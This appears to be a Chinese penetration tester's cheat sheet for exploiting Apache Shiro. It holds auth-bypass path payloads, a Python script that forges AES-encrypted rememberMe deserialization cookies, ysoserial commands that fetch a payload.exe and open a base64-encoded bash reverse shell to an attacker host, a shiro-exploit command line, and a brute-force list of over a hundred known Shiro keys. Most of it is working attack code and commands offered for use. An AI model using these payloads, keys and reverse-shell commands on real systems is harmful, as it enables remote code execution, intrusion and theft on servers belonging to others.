<a name="pMl5E"></a>
## shiro
<a name="XUm4z"></a>
### 权限绕过
```python
/..;/
/;/
/%3b/
/%20/
/%2e/
```
<a name="SxJR5"></a>
### 指纹
cookie添加rememberMe=1;看响应包

权限绕过<br />/;/目录、burpsuit中的包需要url编码后的/%3b<br />比如[http://xxxxxx.com/login](http://xxxxxx.com/;/login)<br />然后[http://xxxxxx.com/;/login](http://xxxxxx.com/;/login)查看网页是否正常，如果正常，很可能存在漏洞，需要找后台的接口登陆。

插件<br />[https://github.com/amad3u4/ShiroScanner/](https://github.com/amad3u4/ShiroScanner/)<br />[https://github.com/rakjong/BurpPlugin_Shiro](https://github.com/rakjong/BurpPlugin_Shiro)<br />安装后，要搜索shiro关键词。才能知道哪些站用了shiro<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615776079696-4ba9237f-77f4-4eeb-844c-aace6fb2f22b.png#height=447&id=dNfQI&originHeight=894&originWidth=1268&originalType=binary&ratio=1&size=89451&status=done&style=none&width=634)
<a name="hJ6lC"></a>
### 加密方式
**新版本Shiro(>=1.4.2)采用了AES-GCM加密方式**，导致旧版工具的加密算法无法正常利用漏洞<br />旧版本是用CBC加密，都是AES的加密算法。

下面的脚本就可以解决最新的加密方式，但是需要同目录下放置ysoserial才行<br />[https://github.com/Ares-X/shiro-exploit](https://github.com/Ares-X/shiro-exploit)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616314539008-4502f3a4-c435-4479-8b8c-63fba6427be5.png#height=388&id=Qfc5M&originHeight=518&originWidth=1079&originalType=binary&ratio=1&size=29673&status=done&style=none&width=809)

[https://github.com/j1anFen/shiro_attack/releases/tag/1.5](https://github.com/j1anFen/shiro_attack/releases/tag/1.5)<br />支持GCM加密打法。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616317976679-ff75fefb-ee2c-4faf-8959-acf68458dc6a.png#height=130&id=NxQQE&originHeight=259&originWidth=725&originalType=binary&ratio=1&size=19466&status=done&style=none&width=362.5)

<a name="sKzRw"></a>
### JRMPClient
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'wget x.x.x.x/payload.exe -O payload.exe'<br />结合**原始的jrmp+cc**

<a name="TvKGQ"></a>
### shiro扫到key，但是没到利用链
<a name="HNFTW"></a>
#### 原始的jrmp+cc
jrmp+cc的方式通过代码执行去测试<br />[https://github.com/insightglacier/Shiro_exploit](https://github.com/insightglacier/Shiro_exploit)<br />[https://www.cnblogs.com/loong-hon/p/10619616.html](https://www.cnblogs.com/loong-hon/p/10619616.html)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628307989148-23e0804e-a67a-44ad-b3b7-8433b0ca50c1.png#height=76&id=uCBxY&originHeight=151&originWidth=1480&originalType=binary&ratio=1&size=22459&status=done&style=none&width=740)
```python
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
 
if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])   
print "rememberMe={0}".format(payload.decode())
```
漏洞复现文章：<br />[https://blog.csdn.net/weixin_41598660/article/details/105748304](https://blog.csdn.net/weixin_41598660/article/details/105748304)

场景：攻击机 192.168.201.129  漏洞主机192.168.201.135

攻击者<br />java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections2 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS4xMjkvMjIyMiAwPiYx}|{base64,-d}|{bash,-i}"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628324869187-70b01822-9c7c-4203-a439-bef5a108ec8e.png#height=211&id=uhfMK&originHeight=211&originWidth=966&originalType=binary&ratio=1&size=153610&status=done&style=none&width=966)<br />nc监听2222端口<br />利用脚本生成jrmp+cc的cookie序列化payload<br />python shirokey.py 攻击机:jrmp监听的端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628324916543-6b32b208-cd6d-4f27-b859-52cbbb8fe341.png#height=118&id=IsWGF&originHeight=118&originWidth=927&originalType=binary&ratio=1&size=123836&status=done&style=none&width=927)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628324995841-674dd13b-3705-461c-b875-745498d650e9.png#height=515&id=SokUj&originHeight=1030&originWidth=1600&originalType=binary&ratio=1&size=170640&status=done&style=none&width=800)<br />获取权限。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628325023544-75ea1212-f4bd-46e3-87c3-322c269975e0.png#height=167&id=R07DS&originHeight=167&originWidth=634&originalType=binary&ratio=1&size=64752&status=done&style=none&width=634)

shirokey.py
```java
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==") #找到的key
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])   
    print("rememberMe={0}".format(payload.decode()))
```



<a name="lQQ90"></a>
#### 复合链
1、尝试用xray扫，xray的利用链比较多<br />2、很可能是cbs2链。CommonsBeanutils2<br />如下feihong的工具就没有cbs2的链子<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618117980542-aa4210c4-da78-4541-afb7-cc04a456cda1.png#height=383&id=jbZEU&originHeight=765&originWidth=1779&originalType=binary&ratio=1&size=276904&status=done&style=none&width=889.5)

 python .\shiro-exploit.py echo -g CommonsBeanutils2 -u [http://](http://cccxzsp.cnca.cn/aasp/static/common/jeesite.min.js)xxx -v 1 -k kPH+bIxk5D2deZiIxcaaaA== -c whoami<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618117916931-fb40cff6-6ac6-474a-b18e-ff294eb05992.png#height=212&id=Zdt1C&originHeight=423&originWidth=1191&originalType=binary&ratio=1&size=73610&status=done&style=none&width=595.5)

<a name="hTNHV"></a>
### GitHub上常见的key(提高命中率)
思路：[https://www.t00ls.net/articles-60673.html](https://www.t00ls.net/articles-60673.html)<br />根据shiro密钥的java语法<br />setCipherKey Base64.decode language:java<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620226776639-721cef64-d389-471e-b966-8ea97b5599d0.png#height=372&id=UdtsP&originHeight=743&originWidth=1477&originalType=binary&ratio=1&size=96976&status=done&style=none&width=738.5)<br />搜索到常见的开发密钥key
```python
fCq+/xW488hMTCD+cmJ3aQ==
Z3VucwAAAAAAAAAAAAAAAA==
4AvVhmFLUs0KTA3Kprsdag==
2AvVhdsgUs0FSA3SDFAdag==
3AvVhmFLUs0KTA3Kprsdag==
wGiHplamyXlVB11UXWol8g==
1QWLxg+NYmxraMoxAXu/Iw==
kPH+bIxk5D2deZiIxcaaaA==
6ZmI6I2j5Y+R5aSn5ZOlAA==
WcfHGU25gNnTxTlmJMeSpw==
5aaC5qKm5oqA5pyvAAAAAA==
ZUdsaGJuSmxibVI2ZHc9PQ==
6ZmI6I2j3Y+R1aSn5BOlAA==
L7RioUULEFhRyxM7a2R/Yg==
3AvVhmFLUs0KTA3KaTHGFg==
wrjUh2ttBPQLnT4JVhriug==
a1b2c3d4e5f6h7j8k9l10m==
a1b2c3d4e5f6g7h8i9j10k==
Vfixl8Hi8tXf/hS8jt2AHw==
U3ByaW5nQmxhZGUAAAAAAA==
7AvVhmFLUs0KTA3Kprsdag==
M1RIN2FVNGt6T2lRU2VNAA==
BT7lf0hw4W/QMxpS/Rb+Ng==
5AvVhmFLUs0KTA3Kprsdag==
bWluZS1hc3NldC1rZXk6QQ==
2AvVhdsgUs0FSA3SDFAder==
wFmevI8j5IHS5e57mamWgQ==
s2SE9y32PvLeYo+VGFpcKA==
qwertyuiopasdfghjklzxc==
potentialshadow9201314==
fCq+/xW488hMTCE+cmJ3FF==
f/SY5TIve5WWzT4aQlABJA==
ewweeleldoforidurdjrei==
empodDEyMwAAAAAAAAAAAA==
XTx6CKLo/SdSgub+OPHSrw==
QVN1bm5uJ3MgU3Vuc2l0ZQ==
MTIzNDU2Nzg5MGFiY2RlZg==
B9rPF8FHhxKJZ9k63ik7kQ==
8AvVhdsgUs0FSA3SDFAdag==
4AvVhmFLUs0KTA3Kprseaf==
2AvVCXsxUs0FSA7SYFjdQg==
zyueODNWdSy+3MnnsYpvsA==
zSyK5Kp6PZAAjlT+eeNMlg==
wyLZMDifwq3sW1vhhHpgKA==
wGiHplamyXlVB11UXWo18g==
w793pPq5ZVBKkj8OhV4KaQ==
u51QxotqpB1whLs0BT/8Zg==
tiVV6g3uZBGfgshesAQbjA==
t5bEITBJmKnOeLlPw1HqtQ==
sgIQrqUVxa1OZRRIK3hLZw==
sBv2t3okbdm3U0r2EVcSzB==
rPNqM6uKFCyaL10AK51UkQ==
mIccZhQt6EBHrZIyw1FAXQ==
jt4H4FpBRaZcF118psqViA==
fcq+/xW488hMTCD+cmJ3aq==
ef5s4edY4dAb4dy3s3Gyb5==
cmVtZW1iZXJNZQAAAAAAAA==
c2hpcm9fYmF0aXMzMgAAAA==
bXRvbnMAAAAAAAAAAAAAAA==
asdfghjklzxcvbnmqwerty==
aG93Y2FuaWdldHlvdWh5ag==
a1b2c3d4e5f6g7h8i9j10l==
ZnJlc2h6Y24xMjM0NTY3OA==
ZAvph3dsQs0FSL3SDFAdag==
YystomRZLMUjiK0Q1+LFdw==
YnlhdnMAAAAAAAAAAAAAAA==
Y29tLnd1YWdlODg4ODg4OA==
Y1JxNSPXVwMkyvES/kJGeQ==
XPgE3lrQuxfE3tBEnU/7iQ==
V2hhdCBUaGUgSGVsbAAAAA==
U3BAbW5nQmxhZGUAAAAAAA==
U0hGX2d1bnMAAAAAAAAAAA==
U0VFX1JFQ19LRVlfV09SRA==
S6Dvc7SNl0Zkh2e2WsODxw==
Rpiv2FMyBujzPqpAOikFyQ==
RgniJLGKYsiCjUx6iv7NWg==
R29yZG9uV2ViAAAAAAAAAA==
Q01TX0JGTFlLRVlfMjAxOQ==
O4pdf+7e+mZe8NyxMTPJmQ==
NsZXjXVklWPZwOfkvk6kUA==
M2djA70UBBUPDibGZBRvrA==
HWrBltGvEZc14h9VpMvZWw==
HOlg7NHb9potm0n5s4ic0Q==
GHxH6G3LFh8Zb3NwoRgfFA==
GAevYnznvgNCURavBhCr1w==
Cj6LnKZNLEowAZrdqyH/Ew==
9E9uBV19JjhIVjsOA+5vqQ==
9AvVhmFLUs0KTA3Kprsdag==
9Ami6v2G5Y+r5aPnE4OlBB==
8jrQAoMK9QplyfscbQnOcg==
8BvVhmFLUs0KTA3Kprsdag==
6ZmI6I2j5Y+R5aSn5Z1lAA==
66v1O8keKNV3TTcGPK1wzg==
5RC7uBZLkByfFfJm22q/Zw==
5AvVhCsgUs0FSA3SDFAdag==
4AvVhmFLUsoKTA3Kprsdag==
4AvVhmFLUs0TTA3Kprsdag==
4AvVhmFLUs0KTA3Kprsdbg==
4AvVhmFLUs0KTA3KprSdAg==
4AvVhmFLUs0KTA3KpUsDag==
3JvYhmBLUs0ETA5Kprsdag==
3Av2hmFLAs0BTA3Kprsd6E==
2adsfasdqerqerqewradsf==
2AvVidsaUSofSA3SDFAdog==
2AvVhdsgUs0FSA3SaFAdfg==
25BsmdYwjnfcWmnhAciDDg==
```

<a name="46BWK"></a>
### 通过利用actuator漏洞下载heapdump 文件  获取到shiro的key值。
[https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html](https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html)

<a name="bD0fc"></a>
### shiro碰到waf，改链
利用这个工具，缩小利用链，可以绕waf<br />[https://github.com/4ra1n/ShortPayload](https://github.com/4ra1n/ShortPayload)
